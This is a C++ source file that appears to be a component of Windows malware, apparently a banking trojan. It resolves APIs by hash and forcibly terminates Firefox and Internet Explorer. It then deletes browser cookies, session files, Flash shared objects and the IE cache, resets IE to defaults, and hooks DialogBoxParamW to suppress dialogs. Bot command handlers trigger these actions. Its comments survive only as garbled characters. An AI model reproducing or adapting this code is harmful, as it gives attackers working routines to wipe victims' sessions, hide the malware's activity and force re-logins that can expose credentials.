#include <windows.h>
#include <wininet.h>
#include "shlobj.h"

#include "coocksol.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "Unhook.h"
#include "Splice.h"
#include "ntdll.h"

//-------------------------------------------------------------------------------
// ��� ����������� ����� ������ ���� ��
typedef INT_PTR ( WINAPI *PDialogBoxParamW )
                ( HINSTANCE hInstance, LPCWSTR lpTemplateName,
                  HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam );
PDialogBoxParamW    Real_DialogBoxParamW;

//-------------------------------------------------------------------------------
bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir);


bool IgnorePath(char *Path)
{
	// ������� ����� ������ � ������ ���� ���� ���� �� ".", ".."
	return (m_lstrcmp(Path, ".") == 0) || (m_lstrcmp(Path,"..") == 0);
}


bool DeleteInSubDirectories(PCHAR Path, PCHAR Mask, bool DeleteSubDir)
{
	// ������� ���������� ������� ����� � ��������������
	PCHAR SearchMask = STR::New(2, Path, "*.*");
    bool Result = false;
	//  ���������� �����
	//  ���� ������ ����������
	WIN32_FIND_DATA Find;
	HANDLE File = pFindFirstFileA(SearchMask, &Find);
	//  ���������� �� �������, ������� �� �������
	if (File == INVALID_HANDLE_VALUE)
	{
		STR::Free(SearchMask);
		return false;
	}

	// �������������� ����
	do
	{
		if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0 && !IgnorePath(Find.cFileName))
		{
			PCHAR NewPath = STR::New(3, Path, Find.cFileName, "\\");
			if (DeleteFiles(NewPath, Mask, true, DeleteSubDir))
				Result = true;
			if (DeleteSubDir)
					pRemoveDirectoryA(NewPath);
			STR::Free(NewPath);
        }
	}
	while (pFindNextFileA(File, &Find));


    pFindClose(File);
	STR::Free(SearchMask);
	return Result;
}


bool DeleteFiles(PCHAR Path, PCHAR Ext, bool Recursive, bool DeleteSubDir)
{
	// ������� ������� ����� � ����������� Ext �� ���������� Path
	// ���������� ����� ������ �������� ������
	if (Path == NULL || Ext == NULL)
		return 0;
	bool Result = false;

	// � ����� � ���, ��� ����� ������������ ����� ��� �������
	// ���������� ���������� �� �����,  ���������� ������������ ��������
	if (Recursive)
		Result = DeleteInSubDirectories(Path, Ext, DeleteSubDir);

	PCHAR Mask = STR::New(2, Path, Ext);

	WIN32_FIND_DATA Search;
	HANDLE File = pFindFirstFileA(Mask, &Search);
	if (File == INVALID_HANDLE_VALUE)
	{
		STR::Free(Mask);
		return Result;
	}
	// ���������� ��������� �����
	while (File != NULL)
	{
        if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
		{
			// ������� ����
			PCHAR FileName = STR::New(2, Path, Search.cFileName);
			//  � ������ ���� ���� ����� ������� "������ ������" ������
			//  ��� ��������
			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
				pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);

			// ������� ����
			if (pDeleteFileA(FileName))
				Result = true;
			STR::Free(FileName);
        }

		// �������� ��������� ����
		if (!pFindNextFileA(File, &Search)) break;;
	}

	// ����������� ������
	STR::Free(Mask);
	pFindClose(File);

	return Result;
}


bool ClearDirectory(PCHAR Path)
{
	// ������� ������� ���������� ������ �� �� ��� ����� � �������������
	return DeleteFiles(Path, "*", true, true);
}

PCHAR GetAppDataPath()
 {
	 // ������� ���������� ���� � ���������� �������� ������ ����������
	char Path[MAX_PATH];
	DWORD Size = MAX_PATH;
	if (!pSHGetSpecialFolderPathA(NULL, &Path[0], CSIDL_APPDATA, false))
		return NULL;

    PCHAR Result = STR::New(2, &Path[0], "\\");
	return Result;
 }

 PCHAR GetUserProfilePath()
 {
	// ���������� ���� � ����� ������������

	PCHAR Path = STR::Alloc(MAX_PATH);

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_PROFILE, false))
	{
		STR::Free(Path);
		return NULL;
	}

	PCHAR Result = STR::New(2, Path, "\\");

	STR::Free(Path);
	return Result;
 }


void KillFireFox()
{
	DWORD Hash_FireFox = 0x7712FEAE; // ��� firefox.exe

	// �������� ������������� ��������
	DWORD Pid = GetProcessIdByHash(Hash_FireFox);

	if ( Pid != (DWORD)-1)
	{
		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//������ �����
		while(GetProcessIdByHash(Hash_FireFox) != -1)
		{
			pSleep(100);
		}
	}
}


bool DeleteFFCookies()
{
	//	 ������� ������� ���� ����� �������� Mozilla Firefox
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	PCHAR Path = STR::New(2, DataPath, "Mozilla\\Firefox\\Profiles\\");
	STR::Free(DataPath);

	KillFireFox();
	bool Result = DeleteFiles(Path, "cookies.sqlite", true, false);
	//������� ������ ��� ������������� �����������
	bool Result2 = DeleteFiles(Path, "sessionstore.*", true, false);

	STR::Free(Path);

	return Result;
}

bool DeleteSOL()
{
	// ������� ������� ������ ��������� Macromedia FlashPlayer
	PCHAR DataPath = GetAppDataPath();
	if (DataPath == NULL)
		return false;

	// ������ ���� � ����� �������
	PCHAR Path = STR::New(2, DataPath, "Macromedia\\Flash Player\\");
	STR::Free(DataPath);
	// ������ ����������
	bool Result = ClearDirectory(Path);
	Result = Result |DeleteFiles("C:\\WINDOWS\\system32\\Macromed\\", "*.sol", true, false);

	STR::Free(Path);
	return Result;
}


DWORD DeleteFirstCasheEntry(HANDLE &H)
{
	// ������� ������ ������� ����
	H = 0;
	LPINTERNET_CACHE_ENTRY_INFOA Entry;
	DWORD Size = 0;
    PCHAR Filter = "cookie:";
	// �������� ������ ������

	pFindFirstUrlCacheEntryA(Filter, NULL, &Size);

	Entry = (LPINTERNET_CACHE_ENTRY_INFOA)MemAlloc(Size);

	// �������� ������������� ������� ���������
	H = pFindFirstUrlCacheEntryA(Filter, Entry, &Size);
	if (H == NULL)
		return pGetLastError();

	// ������� �������
	bool Deleted = pDeleteUrlCacheEntryA(Entry->lpszSourceUrlName) != NULL;

	MemFree(Entry);
	return S_OK;
}


DWORD DeleteNextCacheEntry(HANDLE H)
{
	// ������� ��������� ���������
	LPINTERNET_CACHE_ENTRY_INFOA Entry;
	DWORD Size = 0;
	// ���������� ������ ������
	pFindNextUrlCacheEntryA(H, NULL, &Size);
	Entry = (LPINTERNET_CACHE_ENTRY_INFOA)MemAlloc(Size);

	// ���� ��������� ������� � �������
	if (pFindNextUrlCacheEntryA(H, Entry, &Size) == 0)
	  return pGetLastError();
	else
	  pDeleteUrlCacheEntryA(Entry->lpszSourceUrlName);

	MemFree(Entry);
	return S_OK;
}


bool ClearIECasheEx()
{
	HANDLE H;
	if (DeleteFirstCasheEntry(H) != S_OK)
		return false;

    while (DeleteNextCacheEntry(H) != ERROR_NO_MORE_ITEMS) ;

	pFindCloseUrlCache(H);

    return true;
}


void DeleteIECookieIndexFile()
{
	// ������� ���� ���� �������� �������� ����������
	PCHAR Path = GetUserProfilePath();
	if (Path == NULL)
		return;
	PCHAR FileName = STR::New(2, Path, "Cookies\\index.dat");
	STR::Free(Path);

	pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);
	pDeleteFileA(FileName);

    STR::Free(FileName);
}

bool DeleteIECookies()
{
	// ������� ���� ��������� ���
	bool R = ClearIECasheEx();

	// ��������� ������ ������� �����
	PCHAR Path = GetUserProfilePath();

    PCHAR CookiePath = STR::New(2, Path, "Cookies\\");
	R = R | DeleteFiles(CookiePath, "*.txt", true, false);
	STR::Free(CookiePath);

	// ������� ���� ��������
	PCHAR FileName = STR::New(2, Path, "Cookies\\index.dat");
	pSetFileAttributesA(FileName, FILE_ATTRIBUTE_ARCHIVE);
	pDeleteFileA(FileName);

	STR::Free(FileName);
	STR::Free(Path);

	return R;
}


void DeleteBrowsersCookies()
{
	// ������� ������� ������ ��������� � Macromedia Flash Player
	//DeleteIECookies();
	DeleteFFCookies();
	DeleteSOL();
	//����� ��, ����� ���� ������� � ����������� �� ������� ����
	ExecuteDellCookSol();
}


DWORD WINAPI DeleteCoockThreadProc(LPVOID Data)
{
	DeleteBrowsersCookies();
	pExitThread(0);
	return 0; // ��� �����������
}

void StartDeleteCookiesThread()
{
	StartThread(DeleteCoockThreadProc, NULL);
}
//----------------------------------------------------------------------------

bool ExecuteDeleteCookiesCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
	// ���������� ������� �������� �������
	DeleteBrowsersCookies();
	return true;
}

bool ExecuteSendCookiesCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
{
    return false;
}

/************************************************************************/
//* ���� ��� ������� ������ ��� MemAlloc ������� ������ � ���� ���������*/
BOOL Delete_IECookies_Norm(BOOL bDeleteCookies, BOOL bDeleteCookiesIndex)
{
	char szUserProfile[MAX_PATH]; 
	char szFilePath[MAX_PATH];
	HANDLE hCacheEnumHandle  = NULL;
	LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;
	DWORD  dwSize = 4096; // initial buffer size

	// Delete index.dat if requested. Be sure that index.dat is not locked.
	if(bDeleteCookiesIndex)
	{
		// Retrieve from environment user profile path.
		pExpandEnvironmentStringsA("%userprofile%", &szUserProfile[0], 
														 sizeof(szUserProfile)); 
		m_memset(&szFilePath[0], 0, sizeof(szFilePath));
		//m_memcpy(&szFilePath[0],&szUserProfile[0], m_wcslen(&szUserProfile[0])*sizeof(WCHAR));
		//m_memcpy(&szFilePath[m_wcslen(&szUserProfile[0])],L"\\Cookies\\index.dat", 36);
		
		m_lstrcpy(&szFilePath[0], &szUserProfile[0]);
		m_lstrcat(&szFilePath[0], "\\Cookies\\index.dat");
//		wsprintfW(szFilePath, L"%s%s", szUserProfile, L"\\Cookies\\index.dat");


	//	m_lstrcpy(&szFilePath[0], "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\index.dat");
		pDeleteFileA(szFilePath);
		if(!bDeleteCookies) return TRUE;
	}
	
	// Enable initial buffer size for cache entry structure.
	//lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwSize];
	lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
	lpCacheEntry->dwStructSize = dwSize;
	
	// URL search pattern (1st parameter) options are:  "cookie:", "visited:", 
	// or NULL ("*.*").
	hCacheEnumHandle = pFindFirstUrlCacheEntryA(("cookie:") /* in */, 
		                         lpCacheEntry /* out */, &dwSize /* in, out */);
	
	// First, obtain handle to internet cache with FindFirstUrlCacheEntry
	// for late use with FindNextUrlCacheEntry.
	
	if(hCacheEnumHandle != NULL) 
	{
		pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
	}
	else
	{
		switch(pGetLastError())
		{
            case ERROR_INSUFFICIENT_BUFFER:
				MemFree(lpCacheEntry);
			    //lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwSize];
				lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
			    lpCacheEntry->dwStructSize = dwSize;

			  // Repeat first step search with adjusted buffer, exit if not
				// found again (in practice one buffer's size adustment is  
				// always OK).
				hCacheEnumHandle = pFindFirstUrlCacheEntryA(NULL, lpCacheEntry, &dwSize);
				if(hCacheEnumHandle != NULL) 
				{
					pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
					break;        
				}
				else
				{
					// FindFirstUrlCacheEntry fails again, return.
					MemFree(lpCacheEntry);
					return FALSE; 
				}
			default:
				pFindCloseUrlCache(hCacheEnumHandle);
				MemFree(lpCacheEntry);
				return FALSE;
		}
	}
	
	// Next, use hCacheEnumHandle obtained from the previous step to delete 
	// subsequent items of cache.

	do 
	{
	     // Notice that return values of FindNextUrlCacheEntry (BOOL) and 
		 // FindFirstUrlCacheEntry (HANDLE) are different.

		 if((BOOL)pFindNextUrlCacheEntryA(hCacheEnumHandle, lpCacheEntry, &dwSize))
		 {
			pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
		 }
		 else
		 {
			 switch(pGetLastError())
			 {
                 case ERROR_INSUFFICIENT_BUFFER:
					//lpCacheEntry = //(LPINTERNET_CACHE_ENTRY_INFO);
					MemFree(lpCacheEntry);
					//new char[dwSize];
					lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO)MemAlloc(dwSize);
					lpCacheEntry->dwStructSize = dwSize;

					// Repeat next step search with adjusted buffer, exit if 
					// error comes up again ((in practice one buffer's size 
					// adustment is always OK).

					if(pFindNextUrlCacheEntryA(hCacheEnumHandle, lpCacheEntry, 
						                                               &dwSize)) 
					{
						pDeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);
						break;          
					}
					else
					{
						// FindFirstUrlCacheEntry fails again, return.
						pFindCloseUrlCache(hCacheEnumHandle);
						MemFree(lpCacheEntry);
						return FALSE; 
					}
				    break;
			     case ERROR_NO_MORE_ITEMS:
					 pFindCloseUrlCache(hCacheEnumHandle);
					 MemFree(lpCacheEntry);
					 return TRUE; 
				 default:
					 pFindCloseUrlCache(hCacheEnumHandle);
					 MemFree(lpCacheEntry);
					 return FALSE;
			 }
		 } 
	} while (TRUE);

  return FALSE; // never here
}

/************************************************************************/
// �������� �������� ����� �����: 
// http://social.msdn.microsoft.com/Forums/en/ieextensiondevelopment/thread/ce81943b-32b8-437b-b620-171c3d5893e7
// ��� ������� - ������ "RunDll32.exe InetCpl.cpl,ClearMyTracksByProcess 2"
// � �-�� ResetIEtoDefaults ������ ��
BOOL Delete_IECookies_Vista()
{
	BOOL res = false;

//	OutputDebugStr("IECookies_Vista: reseting IE to default state...");
	typedef int ( WINAPI *ResetIEtoDefaults)( HWND hWnd );
	ResetIEtoDefaults pResetIEtoDefaults = (ResetIEtoDefaults)GetProcAddressEx( NULL, 14, 0x5E2957F0 );
	if (pResetIEtoDefaults)
	{
		pResetIEtoDefaults(0);
	//	OutputDebugStr("ok!");
		res = true;
	}
	/*else
		OutputDebugStr("failed.");*/

	//OutputDebugStr("IECookies_Vista: deleting cookies...");
	typedef void ( CALLBACK *ClearMyTracksByProcess )( HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow );
	ClearMyTracksByProcess pClearMyTracksByProcess = (ClearMyTracksByProcess)GetProcAddressEx( NULL, 14, 0xE2BFBBBE );
	if (pClearMyTracksByProcess)
	{
		pClearMyTracksByProcess(0, (HINSTANCE)pGetModuleHandleA(0), "2", 0);
		//OutputDebugStr("ok!");
		res = true;
	}
	/*else
		OutputDebugStr("failed.");*/


	return res;
}

/************************************************************************/
 INT_PTR WINAPI Hook_DialogBoxParamW(HINSTANCE hInstance, LPCWSTR lpTemplateName,
                                     HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam)
 {
		if (0 == hWndParent) 
		{
			return 1;
		}
		else
		{
			return Real_DialogBoxParamW(hInstance, lpTemplateName, hWndParent, lpDialogFunc, dwInitParam);
		}
 }


/************************************************************************/
//  ����� ��
void Kill_IE()
{

	DWORD Pid = GetProcessIdByHash(0x55D97F2B);
	
	if ( Pid != (DWORD)-1)
	{
		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//������ �����
		while(GetProcessIdByHash(0x55D97F2B) != -1)
		{
			pSleep(100);
		}
	}

	DWORD Hash_IE = 0x250DFA8F; // ��� iexplore.exe




	// �������� ������������� ��������
	Pid = GetProcessIdByHash(Hash_IE);
	if ( Pid == (DWORD)-1)
	{
		Pid = GetProcessIdByHash(0x54163BD);
	}
	if ( Pid != (DWORD)-1)
	{
		pWinStationTerminateProcess(NULL, Pid , DBG_TERMINATE_PROCESS );//������ �����
		while(GetProcessIdByHash(Hash_IE) != -1)
		{
			pSleep(100);
		}
	}
}
/************************************************************************/
bool HookCookie()
{	
	Kill_IE();
	
	UnhookCookie();
	const DWORD HASH_DialogBoxParamW = 0x929A0EB1;
	if ( HookApi( DLL_USER32, HASH_DialogBoxParamW, &Hook_DialogBoxParamW ) )
	{  
		__asm mov [Real_DialogBoxParamW], eax			
	}	
	
	return true;
}

bool ExecuteDellCookSol()
{
	// ������� ������ �� 
	HookCookie();
	char *Info =GetOSInfo();
	if (NULL!=m_strstr(Info,"Vista")||
		NULL!=m_strstr(Info,"2008")||
		NULL!=m_strstr(Info,"Seven"))
	{
		//OutputDebugStr("Delete_IECookies_Vista.");
		Delete_IECookies_Vista();
	}
	MemFree(Info);
	//OutputDebugStr("Delete_IECookies_Norm.");
	Delete_IECookies_Norm(true, true);
	return 0;
}
